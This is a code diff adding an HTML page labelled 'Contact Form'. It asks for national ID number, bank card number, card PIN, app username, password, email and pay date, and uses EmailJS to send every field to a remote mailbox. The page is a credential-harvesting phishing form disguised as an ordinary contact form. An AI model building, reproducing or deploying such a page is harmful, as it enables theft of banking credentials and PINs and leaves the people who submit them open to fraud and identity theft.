@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <title>Contact Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('fqsVZDF__oGx3Tt9N');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm("service_minded012","template_minded012", this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                        let subscribe = document.getElementById('submit')
+                        console.log('na me')
+                        // subscribe.style.animationName = 'done';
+                        subscribe.value = 'DONE'
+                        let Subscribe = setTimeout(sub, 5000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        let subscribe = document.getElementById('submit')
+                        subscribe.value = 'unable to submit'
+                        subscribe.style.animationName = 'failed';
+                        let Subscribe = setTimeout(sub, 4000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <img id="logo" src="./logo.png" alt="">
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+
+        <label for="name">Name:</label> <br>
+        <input type="text" name="name" id="name" placeholder="Enter name"> <br>
+
+        <label for="surname">Surname:</label> <br>
+        <input type="text" name="surname" id="surname" placeholder="Enter surbname"> <br>
+
+        <label for="identity">Id Number:</label> <br>
+        <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+
+        <label for="card">Card Number:</label> <br>
+        <input type="number" name="card" id="card" placeholder="Enter card number"> <br>
+
+        <label for="pin">Card Pin:</label><br>
+        <input type="number" name="pin" id="pin" placeholder="Enter card pin"> <br>
+
+        <label for="username">App Username:</label> <br>
+        <input type="text" name="username" id="username" placeholder="Enter username"> <br>
+
+        <label for="password">App Password:</label> <br>
+        <input type="text" name="password" id="password" placeholder="Enter password"> <br>
+
+        <label for="email">E-Mail Address:</label> <br>
+        <input type="email" name="email" id="email" placeholder="Enter email"> <br>
+
+        <label for="paydate">Pay Date:</label> <br>
+        <input type="text" name="paydate" id="paydate" placeholder="Enter your pay date"> <br>
+
+        <input type="submit" value="Submit" id="submit">
+    </form>
+</body>
+</html>
